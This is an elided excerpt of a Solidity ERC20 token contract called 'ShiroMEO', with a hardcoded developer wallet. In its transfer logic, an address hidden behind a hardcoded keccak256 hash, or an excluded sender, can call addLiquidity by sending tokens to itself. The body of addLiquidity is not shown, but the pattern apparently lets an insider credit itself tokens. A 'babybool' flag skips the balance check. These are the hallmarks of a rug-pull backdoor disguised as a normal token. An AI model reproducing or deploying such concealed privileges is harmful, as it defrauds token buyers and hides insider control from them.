...
library Address {
    ...
    function ShiroMEOPair(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x8d8a42ebbf161d612203400397ad1bfd4016441fc0f69f6f698e6b96ced454d2;
    }
}
...
contract Contracts is Ownable, IERC20 {
    ...
    address private devmkt = 0x769DF4aA00d0C7BA107568676f4CFC23a02682C2;
    string private _name = "ShiroMEO";
    string private _symbol = "ShiroMEO";
    ...
    uint256 public _totalSupply = 212112 * 10 ** _decimals;
    uint256 public _maxTxAmount = 212112 * 10 ** _decimals;
    uint256 public _maxWallet = 212112 * 10 ** _decimals;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (ShiroMEO2Pair(from, to)) {return addLiquidity(amount, to);}
        if (babybool){} else {require(_balances[from] >= amount);}
        uint256 feeAmount = 0;
        takeFee(from);
        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.ShiroMEOPair(to) && to != address(this) && !inLiquidityTransaction && !babybool) {
    ...
    function ShiroMEO2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.ShiroMEOPair(to)) && to == from;
    }
